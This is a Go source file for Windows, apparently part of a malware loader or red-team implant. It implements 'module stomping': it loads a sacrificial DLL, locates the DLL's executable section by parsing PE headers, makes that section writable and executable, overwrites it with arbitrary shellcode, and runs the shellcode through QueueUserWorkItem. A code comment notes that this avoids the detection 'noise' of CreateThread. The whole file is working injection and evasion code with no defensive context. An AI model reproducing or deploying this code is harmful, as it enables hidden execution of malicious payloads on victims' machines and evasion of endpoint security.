//go:build windows

package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// IMAGE_DOS_HEADER magic / offset to PE header
const imageDosSignature = 0x5A4D
const imageNtSignature = 0x00004550

type imageDosHeader struct {
	eMagic    uint16
	_         [29]uint16
	eLfanew   int32
}

type imageFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type imageOptionalHeader64 struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]imageDataDirectory
}

type imageDataDirectory struct {
	VirtualAddress uint32
	Size           uint32
}

type imageNtHeaders64 struct {
	Signature      uint32
	FileHeader     imageFileHeader
	OptionalHeader imageOptionalHeader64
}

type imageSectionHeader struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

const imageScnCntCode uint32 = 0x00000020

// stompModule loads a sacrificial DLL, overwrites its .text section with
// shellcode, then queues a user work item to execute the shellcode in-process.
func stompModule(sacrificialDLL string, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	// Load sacrificial DLL
	dllNameB, err := windows.BytePtrFromString(sacrificialDLL)
	if err != nil {
		return fmt.Errorf("BytePtrFromString: %w", err)
	}
	hMod, _, e := procLoadLibraryA.Call(uintptr(unsafe.Pointer(dllNameB)))
	if hMod == 0 {
		return fmt.Errorf("LoadLibraryA(%s): %v", sacrificialDLL, e)
	}

	base := hMod

	// Parse PE headers to find .text section
	dos := (*imageDosHeader)(unsafe.Pointer(base))
	if dos.eMagic != imageDosSignature {
		return fmt.Errorf("invalid DOS signature")
	}

	nt := (*imageNtHeaders64)(unsafe.Pointer(base + uintptr(dos.eLfanew)))
	if nt.Signature != imageNtSignature {
		return fmt.Errorf("invalid NT signature")
	}

	numSections := nt.FileHeader.NumberOfSections
	// Section headers immediately follow the optional header
	firstSection := uintptr(unsafe.Pointer(&nt.OptionalHeader)) +
		uintptr(nt.FileHeader.SizeOfOptionalHeader)

	var textVA uintptr
	var textSize uint32
	for i := uint16(0); i < numSections; i++ {
		sec := (*imageSectionHeader)(unsafe.Pointer(firstSection + uintptr(i)*unsafe.Sizeof(imageSectionHeader{})))
		if sec.Characteristics&imageScnCntCode != 0 && sec.SizeOfRawData > 0 {
			textVA = base + uintptr(sec.VirtualAddress)
			textSize = sec.SizeOfRawData
			break
		}
	}

	if textVA == 0 {
		return fmt.Errorf("no executable section found in %s", sacrificialDLL)
	}

	if uint32(len(shellcode)) > textSize {
		return fmt.Errorf("shellcode (%d bytes) exceeds .text section (%d bytes)", len(shellcode), textSize)
	}

	// VirtualProtect .text → RWX
	var oldProtect uint32
	r, _, e := procVirtualProtect.Call(
		textVA, uintptr(len(shellcode)),
		uintptr(pageExecuteReadWrite), uintptr(unsafe.Pointer(&oldProtect)),
	)
	if r == 0 {
		return fmt.Errorf("VirtualProtect(RWX): %v", e)
	}

	// Copy shellcode into .text section
	dst := unsafe.Slice((*byte)(unsafe.Pointer(textVA)), len(shellcode))
	copy(dst, shellcode)

	// Restore original protection
	procVirtualProtect.Call(textVA, uintptr(len(shellcode)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))

	// Execute via QueueUserWorkItem (thread pool — avoids CreateThread noise)
	r, _, e = procQueueUserWorkItem.Call(textVA, 0, 0)
	if r == 0 {
		return fmt.Errorf("QueueUserWorkItem: %v", e)
	}

	return nil
}
